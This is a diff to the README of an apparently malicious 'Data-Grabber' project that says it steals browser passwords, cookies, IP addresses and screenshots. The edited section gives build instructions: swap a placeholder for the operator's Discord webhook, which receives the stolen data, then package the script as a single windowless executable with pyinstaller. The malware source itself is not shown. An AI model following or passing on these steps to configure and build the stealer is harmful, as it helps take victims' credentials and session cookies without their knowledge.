@@ -52,12 +52,10 @@ Data-Grabber steals browsers passwords, cookies, ip, screenshot and more.
 
 ## Manual Compile
 1. Before doing everything, replace text 'WEBHOOK_HERE' (line 33) with your discord webhook.
-2. Open command prompt in the same directory as the Data-Grabber (Python) file.
-3. Type `pip install -r requirements.txt` (To install the modules)
-4. Install modules if needed.
-5. On the same directory as python file open command prompt and type:
+2. Install modules if needed.
+3. On the same directory as python file open command prompt and type:
 >pyinstaller --clean --onefile --noconsole -i NONE Data-Grabber
-6. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!
+4. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!
 ---
 
 ### ❤️Supporters❤️
